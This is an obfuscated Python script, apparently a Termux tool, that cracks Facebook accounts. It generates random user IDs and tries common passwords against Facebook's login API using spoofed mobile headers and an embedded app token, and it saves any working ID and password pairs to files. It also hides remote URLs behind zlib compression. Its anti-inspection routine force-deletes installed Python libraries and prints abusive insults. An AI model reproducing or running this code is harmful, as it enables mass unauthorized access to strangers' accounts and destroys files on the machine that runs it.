#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 3.0
#______CODING BY: MEHEDI
#______TELEGRAM : https://t.me/lokmanvau
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'#▬▭▬▭▬▭▬▭[IMPORT]▬▭▬▭▬▭▬▭#
import uuid,base64,os,hashlib,zlib,subprocess,time,platform,requests
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib,marshal,zlib,base64
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from io import BytesIO
import datetime
from urllib.parse import urlencode
os.system("clear");os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip uninstall pycurl -y && pip install pycurl');os.system("clear")
import pycurl
#▬▭▬▭▬▭▬▭[COLOR CODE]▬▭▬▭▬▭▬▭#
white= "\x1b[1;97m";yelloww="\033[1;33m";green = "\x1b[38;5;49m";G0 = "\x1b[38;5;155m";green1 = '\x1b[38;5;154m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";red = "\x1b[38;5;160m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\x1b[38;5;205m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m";orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";rad="\x1b[38;5;160m";YLW="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
style=f"{white}[{red}●{white}]"
#▬▭▬▭▬▭▬▭[PERMISSION OF SDCARD]▬▭▬▭▬▭▬▭#
try:
    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
except PermissionError:
    os.system("clear")
    print(f"{style} {green}❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚ TOOL IS NOT ALLOW WITHOUT STORAGE PERMISSION");os.system('termux-setup-storage');os.system('clear');exit(f"{green} RUN AGAIN 👉 python TAREK-OLD.py")
#▬▭▬▭▬▭▬▭[SECURITY BOX]▬▭▬▭▬▭▬▭#
style_2=f"{white}[{red}●{white}]{green}"
site = '/da'+'ta/data/com.termu'+'x/files/usr/lib/python3.11/s'+'ite-packages/'
alart=(f"{style_2} Kire khankir pola are you mother fucker\n{style_2} Don't try bypass and capture boss\n{style_2} Aibar er moto chere dilam re kankir pola")
try:
    mr_tarek=f'{site}reque'+'sts/'
    if not 'print' in open(mr_tarek+'sess'+'ions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    mr_tarek1=f'{site}reque'+'sts/'
    if not 'print' in open(mr_tarek1+'mod'+'els.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    mr_tarek2=f'{site}reque'+'sts/'
    if not 'print' in open(mr_tarek2+'ap'+'i.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    king=f'{site}reque'+'sts/'
    if not 'sys.stdout.write' in open(king+'sess'+'ions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    qeen=f'{site}req'+'uests/'
    if not 'sys.stdout.write' in open(qeen+'mod'+'els.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    don=f'{site}requ'+'ests/'
    if not 'sys.stdout.write' in open(don+'a'+'pi.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    a=open('requests/sessions.py','r').read()
    if 'print' in a:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    b=open('requests/api.py','r').read()
    if 'print' in b:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    c=open('requests/models.py','r').read()
    if 'print' in c:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    d=open('httpx/_api.py','r').read()
    if 'print' in d:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    e=open('httpx/_auth.py','r').read()
    if 'print' in e:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    f=open('httpx/_models.py','r').read()
    if 'print' in f:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    g=open('requests/sessions.py','r').read()
    if 'sys.stdout.write' in g:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/api.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/models.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    ii=open('httpx/_api.py','r').read()
    if 'sys.stdout.write' in ii:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    j=open('httpx/_auth.py','r').read()
    if 'sys.stdout.write' in j:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    k=open('httpx/_models.py','r').read()
    if 'sys.stdout.write' in k:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    l=open('requests/api.py', 'r').read()
    if "verify = False" in l:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    m=open('requests/sessions.py', 'r').read()
    if "self.verify = False" in m:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    n=open(f'urllib3/conne'+'ction.py', 'r').read()
    if str("cert_reqs = 'CERT_NONE'") in n:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3');exit(f"{alart}")
    else:pass
except Exception as e:pass
#▬▭▬▭▬▭▬▭[PYCURL]▬▭▬▭▬▭▬▭#
def py_curl(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    try:
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.SSL_VERIFYPEER, 1)
        curl.setopt(curl.SSL_VERIFYHOST, 2)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
    except pycurl.error as e:
        return f"An error in py{e}"
    finally:
        curl.close()
    response_body = buffer.getvalue().decode('utf-8')
    return response_body
#▬▭▬▭▬▭▬▭[LOADING SYSTEM]▬▭▬▭▬▭▬▭#
def tarek(z):
      for a in z +'\n':sys.stdout.write(a);sys.stdout.flush();time.sleep(0.050)
#▬▭▬▭▬▭▬▭[OPENING MOMENT]▬▭▬▭▬▭▬▭#
print(f'{style}{green} Checking Update...{white}');time.sleep(2)
os.system("git pull");os.system("xdg-open https://facebook.com/groups/1234876990528830/");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE]▬▭▬▭▬▭▬▭#
try:import pystyle
except ImportError:print(f"{style} {green}installing pystyle...{white}");time.sleep(0.5);os.system('pip install pystyle');import pystyle;os.system('clear')
from pystyle import Colors, Colorate
#▬▭▬▭▬▭▬▭[USER AGENT]▬▭▬▭▬▭▬▭#
def tarek_ua():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
#▬▭▬▭▬▭▬▭[SPECIAL LINE]▬▭▬▭▬▭▬▭#
def linex():
    #print(Colorate.Horizontal(Colors.green_to_white, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    print(f"{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#▬▭▬▭▬▭▬▭[TOOL VERSION]▬▭▬▭▬▭▬▭#
try:
    versionn = py_curl(zlib.decompress(b'x\x9c\x05\xc1\xb1\n\x80 \x10\x00\xd0/\xd2kpj\x8bh*\x13\xc4=\xcc$\x85<C\xcf\xea\xf3{/\x10\xdd\xb5\x07(\xf6\xe5g\xa4\xd0\xf6V}q\x19\xc9#q\x97\x13H\xcd\xcc\xa0\xa7\x99\x89N\xc0\xa8V\xa3\xd5\xc2\xb4R\x12\x92\x8d\x08\xf9:\xb6\xc7\x97\x1a3r\xfa\xe8\x07{^\x1c\x14'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
version = versionn.strip()
#▬▭▬▭▬▭▬▭[BANNER]▬▭▬▭▬▭▬▭#
logo=(Colorate.Horizontal(Colors.green_to_white, """
██████  ██████  ███████  ██  ██████ ██    ██ ██████  ███████ ██████  
██   ██ ██   ██      ██ ███ ██       ██  ██  ██   ██ ██      ██   ██ 
██████  ██   ██     ██   ██ ██        ████   ██████  █████   ██████  
██   ██ ██   ██    ██    ██ ██         ██    ██   ██ ██      ██   ██ 
██████  ██████     ██    ██  ██████    ██    ██████  ███████ ██   ██ 
                                                                     
                                                                     """" MEHEDI"))
info=(f"""{style}{green} FACEBOOK {white}➤ {green}❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚
{style}{green} STATUS   {white}➤ {green}{version}2.0
{style}{green} GITHUB   {white}➤ {green}github.com/BD71CYBER""")
def main_logo():
    os.system("clear");print(logo);linex();print(info);linex()
#▬▭▬▭▬▭▬▭[LOPP]▬▭▬▭▬▭▬▭#
oks,loop,ua,ussr,tw,cps=[],0,[],[],[],[]
#▬▭▬▭▬▭▬▭[MAIN MENU]▬▭▬▭▬▭▬▭#
def main():
    main_logo()
    print(f'{white}[{red}A{white}]{green} START 2011-14 CLONE')
    print(f'{white}[{red}B{white}]{green} START 2009-10 CLONE')
    print(f'{white}[{red}C{white}]{green} JOIN PUBLIC GROUP')
    print(f'{white}[{red}O{white}]{green} EXIT THIS PROGRAM')
    linex()
    year_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if year_select in ['A','a','01','1']:os.system("xdg-open https://facebook.com/groups/1234876990528830/");old_2011_2014()
    elif year_select in ['B','b','02','2']:os.system("xdg-open https://facebook.com/groups/1234876990528830/");old_2009_2010()
    elif year_select in ['c','C','03','3']:os.system("xdg-open https://facebook.com/groups/1234876990528830/");main()
    elif year_select in ['6','f','06','F']:os.system("xdg-open https://facebook.com/groups/1234876990528830/");old_2008()
    elif year_select in ['O','o','00','0']:os.system("xdg-open https://www.facebook.com/@BD71CYBER/");os.system("exit")
    else:main()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2011_2014():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    year_code="10000";clone_system="2011-2014"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=str(random.choice(range(1000000000,9999999999)));user.append(data)
    tl = str(len(user))
    with ThreadPool(max_workers=40) as mr_tarek:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN APTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:mr_tarek.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_tarek.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2009_2010():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    year_code="100000";clone_system="2009-2010"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=str(random.choice(range(100000000,999999999)));user.append(data)
    tl = str(len(user))
    with ThreadPool(max_workers=40) as mr_tarek:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN APTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:mr_tarek.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_tarek.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2008():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    year_code="3";clone_system="2009-2010"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=str(random.choice(range(1000000,9999999)));user.append(data)
    tl = str(len(user))
    with ThreadPool(max_workers=40) as mr_tarek:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN APTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:mr_tarek.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_tarek.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[METHOD 1]▬▭▬▭▬▭▬▭#
def _method_A_(uid,user):
    global oks,loop 
    agent = tarek_ua()
    try:
        sys.stdout.write(f'\r\r{rad}[{green}FINDING-M1{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]');sys.stdout.flush()       
        #for pw in ['১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','506070']:
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": agent,
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            mtd_A=requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in mtd_A:
                oks.append(uid)
                print(f"\r\r{red}[{green1}❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚-OLD-M1--OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_A):
                oks.append(uid)
                print(f"\r\r{red}[{green1}❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚-OLD-M1-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
        time.sleep(20)
#▬▭▬▭▬▭▬▭[METHOD 2]▬▭▬▭▬▭▬▭#
def _method_B_(uid,user):
    global oks,loop 
    Session=requests.session();agent = tarek_ua()
    ua=f"Dalvik/2.1.0 (Linux; U; Android 11; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/"+str(random.randint(410,450))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(50,110))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.randint(410000000,499999999))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-A326U;FBSV/4.4.2;FBCA/arm64-v8a:null;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/0;]"
    try:
        sys.stdout.write(f'\r\r{rad}[{green}FINDING{white}-{green}M2{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]');sys.stdout.flush()       
        #for pw in ['১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','506070']:
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": agent,
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            mtd_B=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in mtd_B:
                oks.append(uid)
                print(f"\r\r{red}[{green1}❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚-OLD-M2-OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_B):
                oks.append(uid)
                print(f"\r\r{red}[{green1}❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/❚█══ᴹᴱᴴᴱᴰᴵ/ˢᴵᶠᴬᵀ══█❚-OLD-M2-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
        time.sleep(20)
#▬▭▬▭▬▭▬▭[ENDED]▬▭▬▭▬▭▬▭#
"""try:
    main_url = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\xf7\r\xd2\rq\x0cr\xf5\xd6510\xd1w\xf6\xf7\x0b\t\xf2\xf7\xd1\r\xf2\xf7\xf7\xd5\xcfM\xcc\xcc\xd3\xf7\xcfI\x89/)\xcaL\xcc\xd1+\xa9(\x01\x00Af\x1b\n'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
status = main_url.strip()
print(f'{style}{green} Checking Tool Status...{white}');time.sleep(2)
if status == "free":
    tarek(f"{green}Congratulations Tool is free now");time.sleep(4);free_login()
elif status == "paid":tarek(f"{green}Tool is paid now");time.sleep(4);menu_key()
else:
    menu_key()"""
main()
#menu_key()
#exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))'))